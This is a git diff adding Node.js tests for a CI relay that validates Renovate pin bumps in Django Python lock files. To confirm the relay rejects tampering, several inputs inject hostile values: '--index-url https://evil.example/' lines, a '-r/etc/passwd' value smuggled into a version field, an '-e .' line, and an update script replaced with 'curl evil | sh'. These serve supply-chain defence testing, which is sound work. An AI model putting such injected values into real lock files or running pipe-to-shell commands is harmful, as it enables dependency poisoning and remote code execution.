@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import childProcess from 'node:child_process';
-import { existsSync, readFileSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
 import path from 'node:path';
 import { test } from 'node:test';
 
@@ -12,6 +12,9 @@ import { temporaryDirectory } from '../test-helpers.mjs';
 import { dashboardPackageVersions } from './image-tags.mjs';
 import { documentedActionPaths } from '../ci/workflow-action-versions.mjs';
 import { dockerCliDockerfile, readDockerCliVersion } from './docker-cli-version.mjs';
+import {
+  pythonRuntimeLocks, regeneratePythonRuntimeLocks, runtimeLockCompileArgs, validatePythonLockChange,
+} from './python-lock-relay.mjs';
 
 const config = JSON.parse(readFileSync(resolveRepoPath('renovate.json'), 'utf8'));
 const env = readFileSync(resolveRepoPath('compose/.env'), 'utf8');
@@ -1029,7 +1032,7 @@ test('Gunicorn and Ruff updates use the framework route and install the hashed l
     assert.ok(files.includes(file), file);
   }
   const script = readFileSync(resolveRepoPath('scripts/versions/renovate-framework-sync.mjs'), 'utf8');
-  assert.ok(script.includes('python_locks=${changed.some((key) => pythonLockVersionKeys.includes(key))}'));
+  assert.ok(script.includes("route === 'pythonLock' || changed.some((key) => pythonLockVersionKeys.includes(key))"));
   const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
   assert.match(workflow, /if: steps\.proposal\.outputs\.python_locks == 'true'/);
   assert.ok(workflow.includes('--requirement .github/requirements/lock-compiler.txt'));
@@ -1158,4 +1161,214 @@ test('Docker CLI relay rejects edits outside the image version and digest before
     assert.equal(existsSync(output), false);
   }
   assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
+});
+
+const [wsgiLock, asgiLock] = pythonRuntimeLocks;
+const readLocks = () => Object.fromEntries(pythonRuntimeLocks.map((file) => [file, readFileSync(resolveRepoPath(file), 'utf8')]));
+const pinValuePattern = /^\S+/;
+const findPin = (content, name) => {
+  const prefix = `${name}==`;
+  let start = 0;
+  while (start <= content.length) {
+    const end = content.indexOf('\n', start);
+    const lineEnd = end === -1 ? content.length : end;
+    if (content.startsWith(prefix, start)) {
+      const valueStart = start + prefix.length;
+      const value = pinValuePattern.exec(content.slice(valueStart, lineEnd))[0];
+      return { valueStart, valueEnd: valueStart + value.length, value };
+    }
+    if (end === -1) break;
+    start = end + 1;
+  }
+  throw new Error(`Missing ${name} pin`);
+};
+const bumpPin = (content, name, version) => {
+  const { valueStart, valueEnd } = findPin(content, name);
+  return `${content.slice(0, valueStart)}${version}${content.slice(valueEnd)}`;
+};
+const lockedPin = (content, name) => findPin(content, name).value;
+
+test('Python lock relay accepts only released pin-version edits outside the env-managed packages', () => {
+  const base = readLocks();
+  const proposed = { [wsgiLock]: bumpPin(base[wsgiLock], 'cachetools', '9.0.0'), [asgiLock]: bumpPin(base[asgiLock], 'cachetools', '9.0.0') };
+  assert.deepEqual(validatePythonLockChange(base, base), []);
+  assert.deepEqual(validatePythonLockChange(base, proposed).map(({ file, packageName, to }) => [file, packageName, to]),
+    [[wsgiLock, 'cachetools', '9.0.0'], [asgiLock, 'cachetools', '9.0.0']]);
+  for (const version of ['0.67b0', '1.2rc1', '2.0.post1']) {
+    assert.equal(validatePythonLockChange(base, { ...base, [asgiLock]: bumpPin(base[asgiLock], 'opentelemetry-distro', version) })[0].to, version);
+  }
+  const crlf = Object.fromEntries(Object.entries(base).map(([file, content]) => [file, content.replaceAll('\n', '\r\n')]));
+  assert.equal(validatePythonLockChange(crlf, { ...crlf, [asgiLock]: bumpPin(crlf[asgiLock], 'cachetools', '9.0.0') })[0].to, '9.0.0');
+  for (const [content, error] of [
+    [bumpPin(base[asgiLock], 'cachetools', '9.0.0.dev1'), /released package version/],
+    [bumpPin(base[asgiLock], 'cachetools', '9.0.0+local'), /released package version/],
+    [bumpPin(base[asgiLock], 'cachetools', '--index-url=https://evil.example/'), /released package version/],
+    [bumpPin(base[asgiLock], 'gunicorn', '99.0.0'), /gunicorn is pinned from compose\/\.env/],
+    [bumpPin(base[asgiLock], 'django', '99.0.0'), /django is pinned from compose\/\.env/],
+    [`${base[asgiLock]}evil==1.0.0\n`, /only existing pin versions/],
+    [`--extra-index-url https://evil.example/\n${base[asgiLock]}`, /only existing pin versions/],
+    [base[asgiLock].replace('    # via uvicorn', '    # via evil'), /only existing pin versions/],
+    [`${base[asgiLock]}cachetools==9.0.0\n`, /Duplicate cachetools/],
+  ]) assert.throws(() => validatePythonLockChange(base, { ...base, [asgiLock]: content }), error);
+  assert.throws(() => validatePythonLockChange(base, { [asgiLock]: base[asgiLock] }), /exactly the Django runtime locks/);
+  assert.throws(() => validatePythonLockChange(base, { ...base, 'compose/.env': 'X: 1' }), /exactly the Django runtime locks/);
+});
+
+test('Python lock regeneration reproduces pins with the trusted compiler and fails closed on drift', (t) => {
+  const workspace = temporaryDirectory(t, 'python-lock-relay-');
+  const base = readLocks();
+  const write = (file, content) => {
+    mkdirSync(path.dirname(path.join(workspace, file)), { recursive: true });
+    writeFileSync(path.join(workspace, file), content);
+  };
+  const reset = () => { for (const [file, content] of Object.entries(base)) write(file, content); };
+  const proposed = { ...base, [asgiLock]: bumpPin(base[asgiLock], 'cachetools', '9.0.0') };
+  const calls = [];
+  const compiler = (output) => (command, args, cwd) => {
+    calls.push([command, args, cwd]);
+    if (command !== 'python') return;
+    const file = args.find((arg) => arg.startsWith('--output-file=')).slice('--output-file='.length);
+    write(file, output(file));
+  };
+  reset();
+  const changes = regeneratePythonRuntimeLocks(proposed, { workspace, run: compiler((file) => proposed[file]) });
+  assert.deepEqual(changes.map(({ packageName }) => packageName), ['cachetools']);
+  assert.deepEqual(calls, [
+    ['python', ['-m', 'piptools', 'compile', '--strip-extras', '--upgrade-package', 'cachetools==9.0.0',
+      '--pip-args=--only-binary :all:', `--output-file=${asgiLock}`, asgiLock.replace('requirements.txt', 'requirements.in')], workspace],
+    ['bash', ['.github/requirements/update-lock.sh'], workspace],
+  ]);
+
+  calls.length = 0;
+  reset();
+  assert.throws(() => regeneratePythonRuntimeLocks(proposed, { workspace, run: compiler((file) => `${proposed[file]}newdep==1.0.0\n`) }),
+    /differs from trusted pip-compile regeneration/);
+  assert.equal(calls.length, 1, 'update-lock.sh must not run after a mismatch');
+
+  for (const malicious of [bumpPin(base[asgiLock], 'cachetools', '-r/etc/passwd'), bumpPin(base[asgiLock], 'django', '9.9.9'), `${base[asgiLock]}-e .\n`]) {
+    calls.length = 0;
+    reset();
+    assert.throws(() => regeneratePythonRuntimeLocks({ ...base, [asgiLock]: malicious }, { workspace, run: compiler(() => assert.fail('compiled')) }));
+    assert.equal(calls.length, 0);
+  }
+  // Stored state cannot choose the comparison base: the trusted checkout supplies it.
+  calls.length = 0;
+  write(asgiLock, bumpPin(base[asgiLock], 'cachetools', '0.0.1'));
+  write(wsgiLock, base[wsgiLock]);
+  const reverted = regeneratePythonRuntimeLocks(base, { workspace, run: compiler((file) => base[file]) });
+  assert.deepEqual(reverted.map(({ from, to }) => [from, to]), [['0.0.1', lockedPin(base[asgiLock], 'cachetools')]]);
+});
+
+test('committed runtime locks are in the trusted pip-compile output form, so pin-only proposals can match', () => {
+  // Captured from pip-tools 7.6.2 on Linux (python:3.13.18-slim-bookworm) for runtimeLockCompileArgs(lock),
+  // with and without --upgrade-package selectors: pip-tools omits the selectors from the header.
+  for (const lock of pythonRuntimeLocks) {
+    const input = lock.replace('requirements.txt', 'requirements.in');
+    const header = [
+      '#', '# This file is autogenerated by pip-compile with Python 3.13', '# by the following command:', '#',
+      `#    pip-compile --output-file=${lock} --pip-args='--only-binary :all:' --strip-extras ${input}`, '#',
+      '--only-binary :all:', '', '',
+    ].join('\n');
+    const content = readFileSync(resolveRepoPath(lock), 'utf8').replaceAll('\r\n', '\n');
+    assert.ok(content.startsWith(header), `${lock} must be regenerated with runtimeLockCompileArgs on Linux`);
+    assert.deepEqual(runtimeLockCompileArgs(lock, ['cachetools==9.0.0']), ['-m', 'piptools', 'compile', '--strip-extras',
+      '--upgrade-package', 'cachetools==9.0.0', '--pip-args=--only-binary :all:', `--output-file=${lock}`, input]);
+    // Windows-only markers (Django's tzdata) would make Linux regeneration differ from the committed lock.
+    assert.doesNotMatch(content, /^tzdata==/m);
+  }
+});
+
+function pythonLockFixture(t, onWrite) {
+  const blobs = new Map();
+  const fixture = publicationFixture(t, (route, options) => {
+    if (options.method !== 'GET') return onWrite?.(route, JSON.parse(options.body)) ?? assert.fail(route);
+    const content = blobs.get(route.slice('git/blobs/'.length));
+    assert.ok(content, route);
+    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
+  });
+  const { base, head, state } = fixture;
+  for (const [file, entry] of base) head.set(file, entry);
+  const add = (tree, file, content, mode = '100644') => {
+    const sha = gitBlobSha(content);
+    blobs.set(sha, content);
+    tree.set(file, { type: 'blob', mode, sha });
+  };
+  const locks = readLocks();
+  for (const [file, content] of Object.entries(locks)) {
+    add(base, file, content);
+    add(head, file, content);
+  }
+  const output = path.join(process.env.RUNNER_TEMP, 'output');
+  const originalOutput = process.env.GITHUB_OUTPUT;
+  process.env.GITHUB_OUTPUT = output;
+  t.after(() => {
+    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
+    else process.env.GITHUB_OUTPUT = originalOutput;
+  });
+  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
+  return { ...fixture, locks, output, stateFile: path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'),
+    change: (file, content, mode) => add(head, file, content, mode),
+    prepare: () => prepare(event, 'synthetic-test-token', 'pythonLock') };
+}
+
+test('Python lock route prepares validated pins for the trusted compiler without writing to the PR', async (t) => {
+  const { change, locks, prepare: preparePins, output, stateFile, mock } = pythonLockFixture(t);
+  const proposed = { [wsgiLock]: bumpPin(locks[wsgiLock], 'cachetools', '9.0.0'), [asgiLock]: bumpPin(locks[asgiLock], 'cachetools', '9.0.0') };
+  for (const file of pythonRuntimeLocks) change(file, proposed[file]);
+  await preparePins();
+  assert.match(readFileSync(output, 'utf8'), /^changed=true\r?\npython_locks=true/m);
+  const saved = JSON.parse(readFileSync(stateFile, 'utf8'));
+  assert.equal(saved.route, 'pythonLock');
+  assert.deepEqual(saved.changed, ['cachetools']);
+  assert.deepEqual(saved.proposed, proposed);
+  // Without the trusted regeneration step, publication refuses to replace the PR's lock edits.
+  await assert.rejects(publish('synthetic-test-token'), /Refusing to overwrite a PR edit/);
+  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
+});
+
+test('Python lock route reports no change when the runtime locks are untouched', async (t) => {
+  const { prepare: preparePins, output, stateFile } = pythonLockFixture(t);
+  await preparePins();
+  assert.match(readFileSync(output, 'utf8'), /^changed=false\r?\npython_locks=false/m);
+  assert.deepEqual(JSON.parse(readFileSync(stateFile, 'utf8')).changed, []);
+});
+
+test('Python lock route rejects unrelated files and env-managed pins before state or output', async (t) => {
+  const { change, locks, base, head, prepare: preparePins, mock, output, stateFile } = pythonLockFixture(t);
+  const beforeState = readFileSync(stateFile, 'utf8');
+  for (const [file, content, error, mode] of [
+    ['services/python/django/gunicorn/common/src/evil.py', 'import os', /Unexpected file/],
+    ['.github/requirements/update-lock.sh', 'curl evil | sh', /Unexpected file/],
+    [asgiLock, bumpPin(locks[asgiLock], 'gunicorn', '99.0.0'), /pinned from compose\/\.env/],
+    [asgiLock, `${locks[asgiLock]}--index-url https://evil.example/\n`, /only existing pin versions/],
+    [asgiLock, bumpPin(locks[asgiLock], 'cachetools', '9.0.0'), /unchanged regular file mode/, '120000'],
+  ]) {
+    change(file, content, mode);
+    await assert.rejects(preparePins(), error);
+    if (base.has(file)) head.set(file, base.get(file));
+    else head.delete(file);
+    assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
+    assert.equal(existsSync(output), false);
+  }
+  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
+});
+
+test('Renovate labels only runtime lock pin bumps for the trusted Python lock relay', () => {
+  const byName = (left, right) => left.localeCompare(right);
+  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('python-lock'));
+  assert.equal(rules.length, 1);
+  assert.deepEqual(rules[0].matchManagers, ['pip_requirements']);
+  assert.deepEqual(rules[0].matchFileNames.toSorted(byName), pythonRuntimeLocks.toSorted(byName));
+  assert.equal(rules[0].rebaseWhen, 'behind-base-branch');
+  const envManaged = config.packageRules.findIndex((rule) => rule.enabled === false && rule.matchPackageNames?.includes('gunicorn'));
+  assert.ok(config.packageRules.indexOf(rules[0]) < envManaged, 'env-managed packages must stay disabled after the label rule');
+  const projections = config.packageRules.find((rule) => rule.enabled === false
+    && rule.matchFileNames?.includes('services/python/django/gunicorn/build-requirements.txt'));
+  assert.ok(projections.matchFileNames.includes('services/python/django/gunicorn/pip-requirements.txt'));
+  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
+  assert.match(workflow, /contains\(github.event.pull_request.labels.\*.name, 'python-lock'\) \|\|\r?\n/);
+  assert.match(workflow, /!contains\([^\n]+ 'docker-cli-version'\) &&\s+contains\([^\n]+ 'python-lock'\)\s+id: python_lock[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs prepare-python-lock/);
+  assert.match(workflow, /steps\.python_lock\.outputs\.python_locks == 'true'\r?\n\s+run: \|\r?\n\s+python -m pip install --require-hashes/);
+  assert.match(workflow, /lock-compiler\.in\r?\n[\s\S]*?if: steps\.python_lock\.outputs\.changed == 'true'\r?\n\s+run: node scripts\/versions\/renovate-framework-sync.mjs relay-python-lock\r?\n[\s\S]*?node scripts\/versions\/sync-framework-versions.mjs --check\r?\n\s+python services\/python\/django\/gunicorn\/sync_build_locks.py --check/);
+  assert.match(workflow, /steps.python_lock.outputs.changed == 'true' \|\|[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs publish/);
 });
